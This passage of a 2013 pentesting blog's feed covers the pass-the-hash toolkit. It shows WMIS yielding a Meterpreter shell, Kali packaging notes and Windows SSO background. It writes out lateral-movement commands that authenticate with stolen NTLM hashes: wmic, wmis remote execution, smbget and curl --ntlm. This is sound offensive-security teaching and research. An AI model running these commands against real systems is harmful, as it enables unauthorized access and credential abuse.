src=&quot;http://4.bp.blogspot.com/-F9fkZHhxgvQ/Uenzp1tgDsI/AAAAAAAAA64/pQTwKFDKw74/s640/wmis_encoding.JPG&quot; width=&quot;436&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;You may notice that the script is ensuring we don&#39;t pass the length restriction for cmd.exe and encoding the string to little endian Unicode before base64 encoding. PowerShell can be quirky, but a good explanation can be found &lt;a href=&quot;http://www.powershellmagazine.com/2012/12/17/pscxtip-how-to-determine-the-byte-order-mark-of-a-text-file/&quot;&gt;here&lt;/a&gt;. &amp;nbsp;After running the script we have the command to feed to WMIS:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/--7A5dr-C-yU/Uen4qgHVSCI/AAAAAAAAA7I/Mbe84rvTOe0/s1600/encode.JPG&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;121&quot; src=&quot;http://4.bp.blogspot.com/--7A5dr-C-yU/Uen4qgHVSCI/AAAAAAAAA7I/Mbe84rvTOe0/s400/encode.JPG&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Now we can run WMIS with the command from the previous script:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-snokX46dDrg/Uen7s-_L1WI/AAAAAAAAA7c/GJehomp7Lo8/s1600/wmis_active.JPG&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;148&quot; src=&quot;http://3.bp.blogspot.com/-snokX46dDrg/Uen7s-_L1WI/AAAAAAAAA7c/GJehomp7Lo8/s400/wmis_active.JPG&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Now we wait. It could take up to a few minutes, but eventually we will have our shell:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-ENf5gUK5NRo/Uen7s5KsHCI/AAAAAAAAA7g/pFCe4fd4EYQ/s1600/shell.JPG&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;96&quot; src=&quot;http://1.bp.blogspot.com/-ENf5gUK5NRo/Uen7s5KsHCI/AAAAAAAAA7g/pFCe4fd4EYQ/s400/shell.JPG&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;That is it. We can pass hashes to get a Meterpreter shell without starting a service, uploading a binary or using SMB. &amp;nbsp;My next post will demonstrate how to automate the entire process and will discuss the release of the latest addition to the PTH-Suite: PowerPTH. Stay tuned.&lt;br /&gt;&lt;br /&gt;Join us at&lt;a href=&quot;https://www.blackhat.com/us-13/briefings.html#Duckwall&quot;&gt; Blackhat&lt;/a&gt;&amp;nbsp;where we will continue our talk from last year with new PtH-related content including some simple mitigations.&amp;nbsp; If you are interested in PowerShell uses in pentesting, check out my blog for a &lt;a href=&quot;http://obscuresecurity.blogspot.com/p/great-posts-articles-and-tutorials.html&quot;&gt;list of great resources&lt;/a&gt;&amp;nbsp;and sign up for Carlos Perez&#39;s &lt;a href=&quot;http://www.derbycon.com/training-courses/#intropower&quot;&gt;PowerShell class at Derbycon&lt;/a&gt;. &amp;nbsp;Speaking of Derbycon, Skip and I will be there too!&lt;br /&gt;&lt;br /&gt;-Chris&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/1861989554793120034/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/07/WMIS-PowerSploit-Shells.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/1861989554793120034'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/1861989554793120034'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/07/WMIS-PowerSploit-Shells.html' title='WMIS: The Missing Piece of the Ownage Puzzle'/><author><name>Chris</name><uri>http://www.blogger.com/profile/10815120708533310068</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='31' height='20' src='http://1.bp.blogspot.com/-Sk9GkEyCexY/TrsYLkcp-1I/AAAAAAAAAYg/IPX7mbAvGvE/s220/obscuresec.png'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://3.bp.blogspot.com/-BzbyfnAGNl4/UejEvjKP6dI/AAAAAAAAA6k/nuiZwC5I_Ik/s72-c/wmis.JPG" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-6491549087711714223</id><published>2013-07-16T22:03:00.002-07:00</published><updated>2013-07-16T22:05:43.671-07:00</updated><title type='text'>Long Overdue Updates - Blackhat, Derbycon and more!</title><content type='html'>&lt;h2&gt;Upcoming Conferences&lt;/h2&gt;&lt;div&gt;In spite of what the BlackHat USA 2013 page says, Chris and I both will be at BlackHat this year presenting a talk that will hopefully help folks understand 1) the problem of PTH and other credential attacks and 2) give folks some solid ideas on how to defend against it. &amp;nbsp;We&#39;re also releasing some tools to help you guys out... &amp;nbsp;I&#39;m not going to spoil the fun, but you know that Chris is big into powershell, right? *wink*&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Also, and it&#39;s not up yet, Chris and I will be heading back to Derbycon this year. &amp;nbsp;We&#39;re really looking forward to it!&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;PTH Tools in Kali&lt;/h2&gt;&lt;div&gt;I&#39;m not sure if everybody saw, but one of the Kali devs did some pretty neat stuff to incorporate the most of the PTH toolset into Kali. &amp;nbsp;For those of you who don&#39;t know Raphael Hertzog, here&#39;s his blog:&amp;nbsp;&lt;a href=&quot;http://raphaelhertzog.com/&quot;&gt;http://raphaelhertzog.com/&lt;/a&gt;. &amp;nbsp;He&#39;s a regular Debian contributor and I know he spent a fair amount of time working on getting PTH in Kali. &amp;nbsp;He has a donations page, if you find the PTH toolsuite useful, please consider donating to him via Paypal. &amp;nbsp;I just did!&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Here&#39;s the Kali post in case you missed it:&amp;nbsp;&lt;a href=&quot;http://www.kali.org/kali-monday/pass-the-hash-toolkit-winexe-updates/&quot;&gt;http://www.kali.org/kali-monday/pass-the-hash-toolkit-winexe-updates/&lt;/a&gt;&lt;/div&gt;&lt;h2&gt;More To Follow...&lt;/h2&gt;I plan on trying to make some more time to post on the blog related to PTH and a series of posts on defense as well. &amp;nbsp;We&#39;ll see how that turns out :/&lt;br /&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/6491549087711714223/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/07/long-overdue-updates-blackhat-derbycon.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6491549087711714223'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6491549087711714223'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/07/long-overdue-updates-blackhat-derbycon.html' title='Long Overdue Updates - Blackhat, Derbycon and more!'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-204615254195393965</id><published>2013-04-14T21:33:00.000-07:00</published><updated>2013-04-14T21:33:05.972-07:00</updated><title type='text'>Missing PTH Tools Writeup - WMIC / WMIS / CURL</title><content type='html'>Looking back over my blog, I realized I never did a writeup on the wmi / wmis / curl with the PTH functionality. &amp;nbsp;so, I&#39;m going to do that now while I&#39;m thinking about it ;-)&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;WMIC / WMIS&lt;/h2&gt;Windows Management Instrumentation (WMI) is officially defined by Microsoft as &quot;the infrastructure for management data and operations on Windows-based operating systems&quot;. &amp;nbsp;You can &lt;a href=&quot;http://lmgtfy.com/?q=wmi+windows&quot; target=&quot;_blank&quot;&gt;Google more&lt;/a&gt;, but the TLDR version is that it uses a subset of ANSI SQL to query the operating the system for various things that might be of value. &amp;nbsp;You can also also interact with the Windows OS by accessing methods that are exposed by the various WMI providers. &amp;nbsp;More on this in a few.&lt;br /&gt;&lt;br /&gt;Somewhere along the way, a WMI client appeared on the net. &amp;nbsp;I&#39;m not sure from whence it came, but for a while it was being used by Zenoss to monitor Windows machines. &amp;nbsp;The problem is that it was written based on an old version of Samba 4 with some additional functionality that has since been removed from the Samba 4 source tree. &amp;nbsp;So, in essence, it&#39;s unsupported and getting it to work with newer versions of Samba would be painful, as one would need to recreate the functionality that got removed a few years ago.&lt;br /&gt;&lt;br /&gt;The first tool I&#39;m going to talk about is &quot;wmic&quot;. &amp;nbsp;This tool can be used to issue WMI queries to a Windows computer. &amp;nbsp;Note, this tool is only for queries. &amp;nbsp;For example:&lt;br /&gt;&lt;br /&gt;root@bt:/opt/rt/bin# wmic &amp;nbsp;-U demo/administrator%hash //172.16.1.1 &quot;select csname,name,processid,sessionid from win32_process&quot;&lt;br /&gt;&lt;br /&gt;This query will list process names and PIDS for running processes on 172.16.1.1 as seen in this picture:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-EO4Ge_5Xd4k/UWt635Bjr7I/AAAAAAAAADw/1HPkLN3z_U4/s1600/wmic-screenshot-kali.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; margin-bottom: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;428&quot; src=&quot;http://1.bp.blogspot.com/-EO4Ge_5Xd4k/UWt635Bjr7I/AAAAAAAAADw/1HPkLN3z_U4/s640/wmic-screenshot-kali.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;The next tool is a little more interesting. &amp;nbsp;I mentioned earlier that there were ways of accessing &#39;methods&#39; of various underlying windows&amp;nbsp;functionality. &amp;nbsp;One of the most interesting ones is&amp;nbsp;&amp;nbsp;the &quot;create&quot; method from the win32_process class. &amp;nbsp;This allows WMI to create a process on the remote system. &amp;nbsp;It will return whether or not the process was created, so one would need to redirect output to a file and grab it somehow. &amp;nbsp;The WMIS tool takes advantage of this behavior to start processes on the remote computer.&lt;br /&gt;&lt;br /&gt;For example, running the command:&lt;br /&gt;&lt;br /&gt;wmis -U demo/administrator%hash //172.16.1.1 &#39;cmd.exe /c dir c:\ &amp;gt; c:\windows\temp\blog.txt&#39;&lt;br /&gt;&lt;br /&gt;runs the command &#39;cmd.exe /c dir c:\ &amp;gt; c:\windows\temp\blog.txt&#39;. &amp;nbsp;Note the &quot;cmd.exe /c&quot; is required to actually execute the command.&lt;br /&gt;&lt;br /&gt;We can then use something like smbget to dump the output IE:&lt;br /&gt;&lt;br /&gt;smbget -w demo -u demo\\administrator -O -p &amp;lt;hash&amp;gt; smb://172.16.1.1/c$/windows/temp/blog.txt&lt;br /&gt;&lt;br /&gt;And, we can see from this screenshot that it worked as expected....&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-S1c9nT0xS_A/UWt-uT3xaaI/AAAAAAAAAEA/xQZ-KfBe5hs/s1600/wmis-screenshot.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; margin-bottom: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;420&quot; src=&quot;http://1.bp.blogspot.com/-S1c9nT0xS_A/UWt-uT3xaaI/AAAAAAAAAEA/xQZ-KfBe5hs/s640/wmis-screenshot.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;What sorts of evil things can you do from the commandline? &amp;nbsp;Aside from piecing together an&amp;nbsp;asynchronous shell, there&#39;s a lot of interesting things you can do...&amp;nbsp; I&#39;ll let @obscuresec answer that one in a guest post here soon.... &amp;nbsp;It&#39;s nice and evil, trust me...&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;CURL&lt;/h2&gt;&lt;br /&gt;Curl is a useful command line web utility that also has support for several other protocols, such as ftp, smtp, pop3, and others. &amp;nbsp; I patched PTH functionality in as a quick method to access some of these other protocols if they prompted for NTLM authentication. &amp;nbsp;The easiest example is grabbing info from a sharepoint server....&lt;br /&gt;&lt;br /&gt;For example, if we want to log in with bob.franklin and grab his default sharepoint page we can do something like this:&lt;br /&gt;&lt;br /&gt;curl --ntlm -u bob.franklin:&amp;lt;hash&amp;gt; http://intranet.demo.local/Pages/Default.aspx&lt;br /&gt;&lt;br /&gt;And you see we get a bunch of html back from the server in the image.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-Gw5BNvRVwhg/UWuBl4DcCUI/AAAAAAAAAEQ/Avtswc33DTw/s1600/curl-blog.png&quot; imageanchor=&quot;1&quot; style=&quot;clear: left; float: left; margin-bottom: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;376&quot; src=&quot;http://2.bp.blogspot.com/-Gw5BNvRVwhg/UWuBl4DcCUI/AAAAAAAAAEQ/Avtswc33DTw/s640/curl-blog.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/204615254195393965/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/04/missing-pth-tools-writeup-wmic-wmis-curl.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/204615254195393965'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/204615254195393965'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/04/missing-pth-tools-writeup-wmic-wmis-curl.html' title='Missing PTH Tools Writeup - WMIC / WMIS / CURL'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://1.bp.blogspot.com/-EO4Ge_5Xd4k/UWt635Bjr7I/AAAAAAAAADw/1HPkLN3z_U4/s72-c/wmic-screenshot-kali.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-6606847570248099582</id><published>2013-04-08T05:49:00.001-07:00</published><updated>2013-04-08T08:42:40.122-07:00</updated><title type='text'>PTH Toolkit  For Kali - Interim status</title><content type='html'>&lt;h2&gt;TLDR&lt;/h2&gt;&lt;br /&gt;I&#39;ve uploaded 2 tarballs to&amp;nbsp;&lt;a href=&quot;https://code.google.com/p/passing-the-hash/downloads/list&quot;&gt;https://code.google.com/p/passing-the-hash/downloads/list&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;One is 32-bit and the other is 64-bit. &amp;nbsp;Everything works from my original talk on both with the exception of wmis, the WMI command execution tool. &amp;nbsp;Extract the tarball into /opt/pth and set your PATH variable to point to /opt/pth/bin and you should be good to go.&lt;br /&gt;&lt;br /&gt;For whatever reason the 64-bit version of wmis didn&#39;t work while the 32-bit version works like a champ. &amp;nbsp;If you need that functionality, use the 32-bit binary (also uploaded). &lt;br /&gt;&lt;br /&gt;In order to use 32-bit binaries on 64-bit Kali, you need to add the 32-bit libraries. &amp;nbsp;Follow these steps:&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;dpkg --add-architecture i386&lt;/li&gt;&lt;li&gt;apt-get update&lt;/li&gt;&lt;li&gt;apt-get install ia32-libs&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Slightly Longer Version&lt;/h2&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I&#39;m starting out by distributing 2 binary tarballs, 32-bit and 64-bit. &amp;nbsp;After having spent a fair amount of time working on the packaging of winexe, only to discover that the latest version didn&#39;t work on 32-bit operating systems, I decided it was time to take the distribution in stages.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, I tweaked my build scripts (found&lt;a href=&quot;https://code.google.com/p/passing-the-hash/source/browse/#svn%2Ftrunk%2Fkali-build&quot; target=&quot;_blank&quot;&gt; here&amp;nbsp;on my google code site&lt;/a&gt;), updated stuff wherever needed and compiled. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I had planned on only releasing one tarball.... then I discovered that 64-bit Kali didn&#39;t have any 32-bit libraries installed. &amp;nbsp;So it became an issue of whether or not to force everybody to install all the required libraries for 32-bit operation. &amp;nbsp;When I looked at it, it was something like another 300mb of libs for everything to work. &amp;nbsp;So I figured that I&#39;d give it a shot to have 64-bit compiled version as well.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Testing revealed that the 64-bit version of the &#39;wmis&#39; tool didn&#39;t work. &amp;nbsp;It gives some sort of RPC error and given the &quot;barely working as it is&quot; nature of things, if folks on 64-bit Kali need to run it then you can install a subset of the 32-bit libraries and it will work just fine for you. &amp;nbsp;I uploaded the 32-bit WMIS to the google code download page so it can be downloaded separately.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;The Tools&lt;/h2&gt;&lt;div&gt;Samba 4 / Openchange - Tools/libraries for interacting with Windows / Active Directory / Exchange&amp;nbsp;&lt;/div&gt;&lt;div&gt;FreeTDS /SQSH - library / utility for interacting with MSSSQL databases&lt;/div&gt;&lt;div&gt;Winexe - PSExec clone&lt;br /&gt;Firefox - ESR 17 release 5&lt;/div&gt;&lt;div&gt;Curl - Command line web browser (upcoming blog post)&lt;/div&gt;&lt;div&gt;Wmic &amp;nbsp;- Simple WMI query tool (upcoming blog post)&lt;/div&gt;&lt;div&gt;Wmis - &amp;nbsp;WMI tool that uses &quot;create process&quot; from WMI to execute single commands (upcoming blog post)&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Installation&lt;/h2&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I&#39;ve uploaded 2 tarballs to&amp;nbsp;&lt;a href=&quot;https://code.google.com/p/passing-the-hash/downloads/list&quot;&gt;https://code.google.com/p/passing-the-hash/downloads/list&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Download the tarball that&#39;s&amp;nbsp;appropriate for your distribution and untar/gzip it to /opt/pth.&lt;br /&gt;&lt;br /&gt;Set your path to include &#39;/opt/pth/bin&#39; and you should be good to go. &amp;nbsp;No need to screw with library paths as &amp;nbsp;all that jazz is compiled into the binaries to look for their libraries in /opt/pth/lib.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;In order to use 32-bit binaries on 64-bit Kali, you need to add the 32-bit libraries. &amp;nbsp;Follow these steps:&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;dpkg --add-architecture i386&lt;/li&gt;&lt;li&gt;apt-get update&lt;/li&gt;&lt;li&gt;apt-get install ia32-libs&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;More To Follow...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/6606847570248099582/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/04/pth-toolkit-for-kali-interim-status.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6606847570248099582'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6606847570248099582'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/04/pth-toolkit-for-kali-interim-status.html' title='PTH Toolkit  For Kali - Interim status'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-2075702811182046667</id><published>2013-03-23T14:12:00.000-07:00</published><updated>2013-03-23T14:12:38.315-07:00</updated><title type='text'>PTH and Kali - Status</title><content type='html'>I was directed to this bug report on the Kali list relating to&lt;a href=&quot;http://t.co/b2T4ubnbKY&quot; target=&quot;_blank&quot;&gt; the PTH-suite being missing:&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;So, where are we at?&lt;br /&gt;&lt;br /&gt;I&#39;m working on it. &amp;nbsp;The big difference between Backtrack and Kali is that Kali is based on Debian and the maintainers are trying to stick to the &#39;Debian&#39; way of doing things. &lt;br /&gt;&lt;br /&gt;When Putehate and I put together the package for Backtrack, we just shoved everything into a single package and stuck it in the repo. &amp;nbsp;The package didn&#39;t have any deps listed, no source was included, etc. &amp;nbsp;The &#39;Debian&#39; way of doing things has the package manager itself build the packages from source. &amp;nbsp;This means that I actually have to pay attention to the extra bits that control package behavior as opposed to just packaging up a bunch of pre-compiled files.&lt;br /&gt;&lt;br /&gt;This is actually a good thing because it makes it easier to update individual packages. &amp;nbsp;Also, it can actually bring less impact to the existing system. &amp;nbsp;Do you know the difference between PTH Samba 4 + Openchange and regular Samba 4 + Openchange? &amp;nbsp;One single shared library file. &amp;nbsp;So if I package that single library up all the existing Samba 4 / Openchange tools can PTH. &amp;nbsp;Remove that package and you have regular functionality.&lt;br /&gt;&lt;br /&gt;Next week I&#39;m on an assessment with Brav0Hax, one of the Kali maintainers and we are going to try to get a bunch of stuff packaged up. &amp;nbsp;I&#39;ll also try to get some functional stuff up on the google code page here in the not too distant future. &amp;nbsp;Unfortunately in the last year there&#39;s been a number of updates on some packages that make my build scripts fail. &amp;nbsp;I&#39;ll try to get that stuff updated sooner rather than later for folks to get back up and going quickly.&lt;br /&gt;&lt;br /&gt;I&#39;m also going to see what happens if you just take the package from Backtrack and dump it into Kali. &amp;nbsp;That could be a messy explosion or it could work fairly well with a couple of minor tweaks. &amp;nbsp;I&#39;m not sure yet. &lt;br /&gt;&lt;br /&gt;Thanks for the patience and know that I&#39;m working on it ;-)</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/2075702811182046667/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/03/pth-and-kali-status.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2075702811182046667'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2075702811182046667'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/03/pth-and-kali-status.html' title='PTH and Kali - Status'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-2203240773669702106</id><published>2013-03-13T23:08:00.000-07:00</published><updated>2013-03-13T23:08:02.732-07:00</updated><title type='text'>Windows Auth - The Nightmare Begins (SSO)</title><content type='html'>I&#39;m going to start with an overview of Windows authentication and why it&#39;s such a large, complicated,&amp;nbsp;unwieldy&amp;nbsp;beast. &amp;nbsp;I&#39;m not going to go into too much detail as there are lots of posts and papers on the subject, however I will hopefully give enough detail for most folks to follow along.&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Single Sign On - The Real Problem&lt;/h2&gt;&lt;div&gt;Everybody knows that there is a trade-off between security and usability. &amp;nbsp;If a system is too complicated then nobody would use it. &amp;nbsp;If it has no security, then nobody want to store data on it. &amp;nbsp;So there needs to be balance.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&quot;Single Sign On&quot;, henceforth &quot;SSO&quot;, is an authentication scheme where the user is only prompted to type their username/password once and the back-end makes every attempt to keep the user from having to do it again. &amp;nbsp;The idea is that everything a user needs to authenticate to is tied together (websites, computer, file shares, email, etc). &amp;nbsp;There&#39;s a little more to it than that, but you get the gist.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Is this a good thing? &amp;nbsp;As a user, I don&#39;t mind typing in my password a couple of times here and there. &amp;nbsp;However, having to log into a computer, then log into a website, then log into email, etc can be a tad annoying. &amp;nbsp;Especially if your password is 30 characters and is a mix of lower, upper, numbers and symbols.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;However, it can also be a bad thing. &amp;nbsp;If a user doesn&#39;t lock their computer before wandering off to the coffee pot or whatever, then somebody can sit down at the computer and do everything in the context of that user. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Ultimately most places use screen savers that automatically lock after a certain amount of time, forcing the user to re-authenticate with their username / password if their computer is left idle too long.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Ok, so many of the issues with SSO can be mitigated by finding a balance. &amp;nbsp;What&#39;s the big issue?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The problem comes in the back-end implementation.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Parlez-Vous Digest Auth?&lt;/h2&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Tying together multiple back-end authentication schemes typically has some challenges. &amp;nbsp;For example, let&#39;s look at part of a packet capture between a Win 7 workstation and a domain controller when ADUC (Active Directory Users and Computers) is used. &amp;nbsp;ADUC uses LDAP to communicate with the DC and &amp;nbsp;LDAP doesn&#39;t directly support authentication mechanisms, instead it relies on the SASL (Simple Authentication and Security Layer) library. &amp;nbsp;From the screenshot below you can see that the DC offers 4 different SASL authentication methods: GSSAPI, GSS-SPNEGO, External, and DIGEST-MD5.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-nZ9qY8D6vso/UUFVsvJzJZI/AAAAAAAAADg/QuRF6TscTtQ/s1600/sasl-ws.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;272&quot; src=&quot;http://1.bp.blogspot.com/-nZ9qY8D6vso/UUFVsvJzJZI/AAAAAAAAADg/QuRF6TscTtQ/s640/sasl-ws.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;SASL Authentication Mechanisms supported by AD&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;ul&gt;&lt;li&gt;GSSAPI - Generic Security Service Application Program Interface. &amp;nbsp;In this context it generally means &quot;use Kerberos&quot;&lt;/li&gt;&lt;li&gt;GSS-SPNEGO - Generic Security Service Simple and Protected Negotiation. &amp;nbsp;In this context it means &quot;try to use Kerberos first, then switch to NTLM&quot;&lt;/li&gt;&lt;li&gt;EXTERNAL - This means that the authentication is implied by the context, IE IPSec or TLS is in use&lt;/li&gt;&lt;li&gt;DIGEST-MD5 - This 